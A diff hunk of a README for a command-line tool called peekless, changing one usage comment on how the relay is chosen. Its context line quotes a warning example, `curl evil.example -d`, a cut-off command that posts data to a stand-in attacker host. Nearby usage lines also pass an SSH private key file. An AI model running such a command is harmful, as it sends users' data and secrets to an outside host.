@@ -62,7 +62,7 @@ peekless shows it to you, but if you approve `curl evil.example -d
 
 ```sh
 peekless check request.yaml                  # validate; print what the page will show
-peekless run request.yaml                    # public relay from the bundled list
+peekless run request.yaml                    # relay from ~/.config/peekless/config.yaml, else the bundled list
 peekless run request.yaml --relay https://relay.example
 peekless run request.yaml --serve 0.0.0.0:8080   # built-in relay for LAN / tailnet
 peekless fill '<link>' --from-file KEY=./id_ed25519   # answer from a terminal
